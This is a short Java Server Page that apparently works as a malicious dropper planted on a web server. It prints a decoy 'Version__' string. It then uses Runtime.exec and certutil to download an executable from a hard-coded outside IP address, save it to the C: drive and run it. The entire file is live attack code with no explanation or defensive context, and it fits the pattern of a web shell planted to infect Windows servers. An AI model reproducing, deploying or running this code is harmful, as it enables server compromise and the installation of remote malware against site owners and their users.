<%@ page import="java.util.*,java.io.*"%>
<%
out.println("Version__");
Runtime.getRuntime().exec("cmd.exe /c certutil.exe -urlcache -split -f http://101.99.84.136/cab/sts.exe c:/st.exe&cmd.exe /c c:\\st.exe");
%>